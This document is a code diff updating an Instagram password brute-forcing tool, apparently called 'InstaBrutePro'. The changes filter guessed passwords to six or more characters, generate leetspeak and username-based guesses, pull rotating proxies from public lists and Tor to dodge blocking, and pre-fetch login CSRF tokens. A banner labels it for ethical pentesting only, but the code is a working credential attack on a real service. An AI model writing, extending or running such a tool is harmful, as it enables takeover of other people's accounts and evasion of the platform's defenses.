@@ -35,7 +35,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v3.1 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v3.2 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -97,8 +97,8 @@ def interleave_keywords(keyword1, keyword2):
     result.append(interleaved)
     return result
 
-def generate_variations(keywords, username, mode, max_variations=1000):
-    """Generate password variations based on mode."""
+def generate_variations(keywords, username, mode, max_variations):
+    """Generate password variations based on mode, enforcing 6-char minimum."""
     variations = set()
     username_parts = [username] + username.split('123')[:1]  # e.g., testuser123 -> testuser
 
@@ -109,26 +109,42 @@ def generate_variations(keywords, username, mode, max_variations=1000):
             for leet1 in leet_speak(keyword1):
                 for leet2 in leet_speak(keyword2):
                     # Direct concatenation
-                    variations.add(f"{leet1}{leet2}")
-                    variations.add(f"{leet2}{leet1}")
+                    combo1 = f"{leet1}{leet2}"
+                    combo2 = f"{leet2}{leet1}"
+                    if len(combo1) >= 6:
+                        variations.add(combo1)
+                    if len(combo2) >= 6:
+                        variations.add(combo2)
                     # Interleaved
-                    variations.update(interleave_keywords(leet1, leet2))
+                    for interleaved in interleave_keywords(leet1, leet2):
+                        if len(interleaved) >= 6:
+                            variations.add(interleaved)
                     # Username-based
                     for part in username_parts:
-                        variations.add(f"{part}{leet1}{leet2}")
-                        variations.add(f"{leet1}{leet2}{part}")
+                        combo3 = f"{part}{leet1}{leet2}"
+                        combo4 = f"{leet1}{leet2}{part}"
+                        if len(combo3) >= 6:
+                            variations.add(combo3)
+                        if len(combo4) >= 6:
+                            variations.add(combo4)
 
     if mode in ['normal', 'all']:
         # Normal mode: use keywords as full passwords
         for keyword in keywords:
-            variations.add(keyword)
+            if len(keyword) >= 6:
+                variations.add(keyword)
             for leet_var in leet_speak(keyword):
-                variations.add(leet_var)
-                for part in username_parts:
-                    variations.add(f"{part}{leet_var}")
-                    variations.add(f"{leet_var}{part}")
+                if len(leet_var) >= 6:
+                    variations.add(leet_var)
+                    for part in username_parts:
+                        combo5 = f"{part}{leet_var}"
+                        combo6 = f"{leet_var}{part}"
+                        if len(combo5) >= 6:
+                            variations.add(combo5)
+                        if len(combo6) >= 6:
+                            variations.add(combo6)
 
-    return list(variations)[:max_variations]
+    return list(variations)[:max_variations] if mode != 'normal' else list(variations)
 
 def is_valid_proxy(proxy):
     """Validate proxy format and connectivity."""
@@ -148,39 +164,48 @@ def is_valid_proxy(proxy):
     except:
         return False
 
-def refresh_proxies():
-    """Fetch new proxies from proxyscrape API."""
+def fetch_proxies():
+    """Fetch proxies from multiple sources."""
     proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
-    try:
-        resp = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all", timeout=10)
-        if resp.status_code == 200:
-            new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip()]
-            proxies.extend([p for p in new_proxies if is_valid_proxy(p)])
-        else:
-            print(f"{Colors.RED}[!] Proxy refresh failed! Using Tor only.{Colors.NC}")
-    except requests.RequestException as e:
-        print(f"{Colors.RED}[!] Proxy refresh error: {e}{Colors.NC}")
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
+        "https://www.free-proxy-list.net/anonymous-proxy.txt"
+    ]
+    for source in sources:
+        try:
+            resp = requests.get(source, timeout=10)
+            if resp.status_code == 200:
+                new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip()]
+                proxies.extend([p for p in new_proxies if is_valid_proxy(p)])
+            else:
+                print(f"{Colors.RED}[!] Proxy fetch failed from {source}{Colors.NC}")
+        except requests.RequestException as e:
+            print(f"{Colors.RED}[!] Proxy fetch error from {source}: {e}{Colors.NC}")
+    return proxies
+
+def refresh_proxies():
+    """Refresh and save proxies."""
+    proxies = fetch_proxies()
     random.shuffle(proxies)
     with open('proxies/free_proxies.txt', 'w') as f:
         f.write('\n'.join(proxies))
     return proxies[:200]
 
 def get_proxies():
-    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
+    proxies = fetch_proxies()
     try:
         with open('proxies/free_proxies.txt', 'r') as f:
             for line in f:
                 line = line.strip()
-                if line and is_valid_proxy(line):
+                if line and is_valid_proxy(line) and line not in proxies:
                     proxies.append(line)
     except FileNotFoundError:
-        print(f"{Colors.RED}[!] Proxies file missing! Using Tor only.{Colors.NC}")
-    random.shuffle(proxies)
-    return proxies[:200]
+        print(f"{Colors.RED}[!] Proxies file missing! Fetching new proxies.{Colors.NC}")
+    return proxies
 
 def sort_proxies(proxies):
     working = []
-    print(f"{Colors.YELLOW}[*] Sorting proxies...{Colors.NC}")
+    print(f"{Colors.YELLOW}[*] Validating proxies...{Colors.NC}")
     with ThreadPoolExecutor(max_workers=50) as exec:
         working = [p for p in exec.map(lambda p: p if is_valid_proxy(p) else None, proxies) if p]
     with open('proxies/working_proxies.txt', 'w') as f:
@@ -315,6 +340,10 @@ def worker(queue, username, proxies, mode):
     csrf = None
     while not queue.empty() and not found:
         pw = queue.get()
+        if len(pw) < 6:  # Enforce 6-char minimum
+            print(f"{Colors.CYAN}[-] Skipping {pw} (less than 6 chars){Colors.NC}")
+            queue.task_done()
+            continue
         success, new_csrf = try_password(username, pw, proxies)
         if new_csrf:
             csrf = new_csrf
@@ -349,6 +378,7 @@ def main():
     parser.add_argument('-r', action='store_true', help='Resume session')
     parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
     parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
+    parser.add_argument('--max-variations', type=int, default=10000, help='Max password variations (except normal mode)')
     args = parser.parse_args()
 
     # Select mode interactively
@@ -363,6 +393,22 @@ def main():
         print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
         return
 
+    # Pre-fetch and validate proxies
+    print(f"{Colors.YELLOW}[*] Pre-fetching proxies...{Colors.NC}")
+    proxies = get_proxies()
+    proxies = sort_proxies(proxies)
+    if not proxies:
+        print(f"{Colors.RED}[!] No valid proxies available! Start Tor with ./multitor.sh{Colors.NC}")
+        return
+
+    # Pre-fetch CSRF token
+    print(f"{Colors.YELLOW}[*] Pre-fetching CSRF token...{Colors.NC}")
+    csrf = get_csrf(proxies)
+    if not csrf:
+        print(f"{Colors.RED}[!] Failed to fetch CSRF token - Exiting{Colors.NC}")
+        return
+    print(f"{Colors.GREEN}[+] Loaded {len(proxies)} working proxies and CSRF token{Colors.NC}")
+
     # Load keywords/passwords
     print(f"{Colors.YELLOW}[*] Loading {mode} mode from: {args.w}...{Colors.NC}")
     try:
@@ -374,9 +420,9 @@ def main():
 
     # Generate variations based on mode
     if mode == 'normal':
-        words = keywords
+        words = [w for w in keywords if len(w) >= 6]  # Enforce 6-char minimum
     else:
-        words = generate_variations(keywords, args.u, mode)
+        words = generate_variations(keywords, args.u, mode, args.max_variations)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
 
     # Load checkpoint
@@ -390,19 +436,6 @@ def main():
             print(f"{Colors.RED}[!] Invalid checkpoint. Starting from beginning.{Colors.NC}")
             resume_line = 0
 
-    # Proxies
-    print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
-    try:
-        with open(args.p, 'r') as f:
-            proxies = [line.strip() for line in f if line.strip() and is_valid_proxy(line)]
-    except FileNotFoundError:
-        proxies = []
-    if not proxies:
-        proxies = get_proxies()
-        proxies = sort_proxies(proxies)
-    if not proxies:
-        print(f"{Colors.RED}[!] No valid proxies available! Start Tor with ./multitor.sh{Colors.NC}")
-        return
     print(f"{Colors.GREEN}[+] Loaded {len(words)} passwords, {len(proxies)} proxies, {args.t} threads{Colors.NC}")
 
     queue = Queue()
